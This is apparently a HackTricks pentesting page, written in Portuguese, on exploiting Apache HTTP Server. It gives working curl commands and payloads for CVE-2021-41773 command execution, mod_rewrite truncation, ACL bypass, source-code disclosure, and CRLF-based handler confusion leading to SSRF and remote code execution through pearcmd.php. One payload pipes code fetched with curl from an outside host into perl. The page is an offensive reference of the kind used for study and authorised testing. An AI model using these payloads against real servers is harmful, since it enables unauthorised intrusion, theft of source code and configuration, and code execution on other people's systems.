# Apache

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Extens√µes PHP execut√°veis

Verifique quais extens√µes est√£o sendo executadas pelo servidor Apache. Para procur√°-las, voc√™ pode executar:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
Al√©m disso, alguns lugares onde voc√™ pode encontrar essa configura√ß√£o s√£o:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773

{% code overflow="wrap" %}
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
{% endcode %}

## Confusion Attack <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

Esses tipos de ataques foram introduzidos e documentados [**pela Orange neste post do blog**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) e o seguinte √© um resumo. O ataque de "confus√£o" basicamente explora como os dezenas de m√≥dulos que trabalham juntos para criar um Apache n√£o funcionam perfeitamente sincronizados e fazer com que alguns deles modifiquem alguns dados inesperados pode causar uma vulnerabilidade em um m√≥dulo posterior.

### Filename Confusion

#### Truncation

O **`mod_rewrite`** ir√° truncar o conte√∫do de `r->filename` ap√≥s o caractere `?` ([_**modules/mappers/mod\_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod\_rewrite.c#L4141)). Isso n√£o est√° totalmente errado, pois a maioria dos m√≥dulos tratar√° `r->filename` como uma URL. Mas em outras ocasi√µes isso ser√° tratado como um caminho de arquivo, o que causaria um problema.

* **Path Truncation**

√â poss√≠vel abusar do `mod_rewrite` como no seguinte exemplo de regra para acessar outros arquivos dentro do sistema de arquivos, removendo a √∫ltima parte do caminho esperado, adicionando simplesmente um `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
#¬†the output of file `/var/user/orange/secret.yml`
```
* **Atribui√ß√£o Enganosa do RewriteFlag**

Na seguinte regra de reescrita, desde que a URL termine em .php, ela ser√° tratada e executada como php. Portanto, √© poss√≠vel enviar uma URL que termina em .php ap√≥s o caractere `?` enquanto carrega no caminho um tipo diferente de arquivo (como uma imagem) com c√≥digo php malicioso dentro dele:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **Bypass de ACL**

√â poss√≠vel acessar arquivos que o usu√°rio n√£o deveria conseguir acessar, mesmo que o acesso deva ser negado com configura√ß√µes como:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
Isso ocorre porque, por padr√£o, o PHP-FPM receber√° URLs que terminam em `.php`, como `http://server/admin.php%3Fooo.php` e porque o PHP-FPM remover√° qualquer coisa ap√≥s o caractere `?`, a URL anterior permitir√° carregar `/admin.php`, mesmo que a regra anterior a pro√≠ba.

### Confus√£o do DocumentRoot
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Um fato interessante sobre o Apache √© que a reescrita anterior tentar√° acessar o arquivo tanto do documentRoot quanto da raiz. Assim, uma solicita√ß√£o para `https://server/abouth.html` verificar√° o arquivo em `/var/www/html/about.html` e `/about.html` no sistema de arquivos. O que basicamente pode ser explorado para acessar arquivos no sistema de arquivos.

#### **Divulga√ß√£o de C√≥digo Fonte do Lado do Servidor**

* **Divulgar C√≥digo Fonte CGI**

Basta adicionar um %3F no final para vazar o c√≥digo fonte de um m√≥dulo cgi:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
* **Divulgar C√≥digo Fonte PHP**

Se um servidor tiver diferentes dom√≠nios, sendo um deles um dom√≠nio est√°tico, isso pode ser explorado para percorrer o sistema de arquivos e vazar c√≥digo php:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Manipula√ß√£o de Gadgets Locais**

O principal problema com o ataque anterior √© que, por padr√£o, a maioria dos acessos ao sistema de arquivos ser√° negada, como na [configura√ß√£o padr√£o](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115) do Apache HTTP Server:
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
No entanto, os sistemas operacionais [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) permitem por padr√£o `/usr/share`:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Portanto, seria poss√≠vel **abusar de arquivos localizados dentro de `/usr/share` nessas distribui√ß√µes.**

**Gadget Local para Divulga√ß√£o de Informa√ß√µes**

* **Apache HTTP Server** com **websocketd** pode expor o script **dump-env.php** em **/usr/share/doc/websocketd/examples/php/**, que pode vazar vari√°veis de ambiente sens√≠veis.
* Servidores com **Nginx** ou **Jetty** podem expor informa√ß√µes sens√≠veis de aplica√ß√µes web (por exemplo, **web.xml**) atrav√©s de suas ra√≠zes web padr√£o localizadas em **/usr/share**:
* **/usr/share/nginx/html/**
* **/usr/share/jetty9/etc/**
* **/usr/share/jetty9/webapps/**

**Gadget Local para XSS**

* No Ubuntu Desktop com **LibreOffice instalado**, explorar o recurso de troca de idioma dos arquivos de ajuda pode levar a **Cross-Site Scripting (XSS)**. Manipular a URL em **/usr/share/libreoffice/help/help.html** pode redirecionar para p√°ginas maliciosas ou vers√µes mais antigas atrav√©s de **unsafe RewriteRule**.

**Gadget Local para LFI**

* Se PHP ou certos pacotes front-end como **JpGraph** ou **jQuery-jFeed** estiverem instalados, seus arquivos podem ser explorados para ler arquivos sens√≠veis como **/etc/passwd**:
* **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
* **/usr/share/javascript/jquery-jfeed/proxy.php**
* **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Gadget Local para SSRF**

* Utilizando **MagpieRSS's magpie\_debug.php** em **/usr/share/php/magpierss/scripts/magpie\_debug.php**, uma vulnerabilidade SSRF pode ser facilmente criada, fornecendo um gateway para mais explora√ß√µes.

**Gadget Local para RCE**

* As oportunidades para **Remote Code Execution (RCE)** s√£o vastas, com instala√ß√µes vulner√°veis como um **PHPUnit** desatualizado ou **phpLiteAdmin**. Estes podem ser explorados para executar c√≥digo arbitr√°rio, demonstrando o extenso potencial da manipula√ß√£o de gadgets locais.

#### **Jailbreak a partir de Gadgets Locais**

Tamb√©m √© poss√≠vel fazer jailbreak a partir das pastas permitidas seguindo symlinks gerados por softwares instalados nessas pastas, como:

* **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
* **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
* **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
* **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
* **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Al√©m disso, abusando de symlinks foi poss√≠vel obter **RCE no Redmine.**

### Confus√£o de Manipuladores <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Este ataque explora a sobreposi√ß√£o de funcionalidade entre as diretivas `AddHandler` e `AddType`, que ambas podem ser usadas para **habilitar o processamento PHP**. Originalmente, essas diretivas afetavam campos diferentes (`r->handler` e `r->content_type`, respectivamente) na estrutura interna do servidor. No entanto, devido a c√≥digo legado, o Apache trata essas diretivas de forma intercambi√°vel sob certas condi√ß√µes, convertendo `r->content_type` em `r->handler` se o primeiro estiver definido e o √∫ltimo n√£o.

Al√©m disso, no Apache HTTP Server (`server/config.c#L420`), se `r->handler` estiver vazio antes de executar `ap_run_handler()`, o servidor **usa `r->content_type` como o manipulador**, efetivamente tornando `AddType` e `AddHandler` id√™nticos em efeito.

#### **Sobrescrever Manipulador para Divulgar C√≥digo Fonte PHP**

Nesta [**palestra**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013\_dmitriev-maksim.pdf), foi apresentada uma vulnerabilidade onde um `Content-Length` incorreto enviado por um cliente pode fazer com que o Apache **retorne o c√≥digo fonte PHP**. Isso ocorreu devido a um problema de manuseio de erros com ModSecurity e o Apache Portable Runtime (APR), onde uma resposta dupla leva a sobrescrever `r->content_type` para `text/html`.\
Como o ModSecurity n√£o lida corretamente com valores de retorno, ele retornaria o c√≥digo PHP e n√£o o interpretaria.

#### **Sobrescrever Manipulador para XXXX**

TODO: Orange ainda n√£o divulgou essa vulnerabilidade

### **Invocar Manipuladores Arbitr√°rios**

Se um atacante conseguir controlar o cabe√ßalho **`Content-Type`** em uma resposta do servidor, ele poder√° **invocar manipuladores de m√≥dulo arbitr√°rios**. No entanto, no ponto em que o atacante controla isso, a maior parte do processo da solicita√ß√£o j√° ter√° sido conclu√≠da. No entanto, √© poss√≠vel **reiniciar o processo de solicita√ß√£o abusando do cabe√ßalho `Location`** porque se o `Status` retornado for 200 e o cabe√ßalho `Location` come√ßar com uma `/`, a resposta √© tratada como uma Redire√ß√£o do Lado do Servidor e deve ser processada.

De acordo com [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (especifica√ß√£o sobre CGI) na [Se√ß√£o 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) define um comportamento de Resposta de Redirecionamento Local:

> O script CGI pode retornar um caminho URI e uma string de consulta (‚Äòlocal-pathquery‚Äô) para um recurso local em um campo de cabe√ßalho Location. Isso indica ao servidor que ele deve reprocessar a solicita√ß√£o usando o caminho especificado.

Portanto, para realizar este ataque √© necess√°rio uma das seguintes vulnerabilidades:

* Inje√ß√£o CRLF nos cabe√ßalhos de resposta CGI
* SSRF com controle completo dos cabe√ßalhos de resposta

#### **Manipulador Arbitr√°rio para Divulga√ß√£o de Informa√ß√µes**

Por exemplo, `/server-status` deve ser acess√≠vel apenas localmente:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
√â poss√≠vel acess√°-lo definindo o `Content-Type` como `server-status` e o cabe√ßalho Location come√ßando com `/`
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Manipulador Arbitr√°rio para SSRF Completo**

Redirecionando para `mod_proxy` para acessar qualquer protocolo em qualquer URL:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
No entanto, o cabe√ßalho `X-Forwarded-For` √© adicionado, impedindo o acesso aos endpoints de metadados da nuvem.

#### **Manipulador Arbitr√°rio para Acessar o Socket de Dom√≠nio Unix Local**

Acesse o Socket de Dom√≠nio Unix local do PHP-FPM para executar um backdoor PHP localizado em `/tmp/`:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Manipulador Arbitr√°rio para RCE**

A imagem oficial do [PHP Docker](https://hub.docker.com/\_/php) inclui o PEAR (`Pearcmd.php`), uma ferramenta de gerenciamento de pacotes PHP via linha de comando, que pode ser explorada para obter RCE:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Verifique o [**Resumo de LFI do Docker PHP**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), escrito por [Phith0n](https://x.com/phithon\_xg) para os detalhes desta t√©cnica.

## Refer√™ncias

* [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
